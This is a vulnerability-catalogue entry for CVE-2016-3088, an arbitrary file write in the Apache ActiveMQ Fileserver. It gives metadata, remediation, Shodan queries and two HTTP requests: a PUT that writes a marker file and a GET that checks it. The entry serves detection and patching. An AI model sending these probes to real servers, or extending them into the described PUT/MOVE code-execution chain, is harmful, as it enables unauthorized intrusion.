---
layout: post
cve_id: CVE-2016-3088
title: Apache ActiveMQ Fileserver - Arbitrary File Write
pcap: true
pcap_path: /pcaps/2016/CVE-2016-3088.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2016/CVE-2016-3088.yaml
snort2_rule: N/A
snort3_rule: N/A
author: fq_hsu
severity: critical
impact: 'An attacker can write arbitrary files on the server, potentially leading
  to remote code execution.

  '
remediation: 'Upgrade to Apache ActiveMQ version 5.14.0 or later to fix the vulnerability.

  '
reference:
- https://www.exploit-db.com/exploits/40857
- https://medium.com/@knownsec404team/analysis-of-apache-activemq-remote-code-execution-vulnerability-cve-2016-3088-575f80924f30
- http://activemq.apache.org/security-advisories.data/CVE-2016-3088-announcement.txt
- https://nvd.nist.gov/vuln/detail/CVE-2016-3088
- http://rhn.redhat.com/errata/RHSA-2016-2036.html
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2016-3088
  cwe-id: CWE-20
  epss-score: 0.94294
  epss-percentile: 0.99938
  cpe: cpe:2.3:a:apache:activemq:*:*:*:*:*:*:*:*
metadata:
  max-request: 2
  vendor: apache
  product: activemq
  shodan-query:
  - cpe:"cpe:2.3:a:apache:activemq"
  - product:"activemq openwire transport"
tags:
- cve2016
- cve
- fileupload
- kev
- edb
- apache
- activemq
- intrusive
- vkev
- vuln
---

## üîç Vulnerability Description
Apache ActiveMQ 5.x before 5.14.0 allows remote attackers to upload and execute arbitrary files via an HTTP PUT followed by an HTTP MOVE request via the Fileserver web application.

## üåê HTTP Request
```nohighlight
PUT /fileserver/38CHgC49o1Z4ZbIArYF5E0OXuJC.txt HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Connection: close
Content-Length: 8
Accept-Encoding: gzip
65750761
```

```nohighlight
GET /fileserver/38CHgC49o1Z4ZbIArYF5E0OXuJC.txt HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.7.20) Gecko/ Firefox/3.6.11
Connection: close
Accept-Encoding: gzip
```

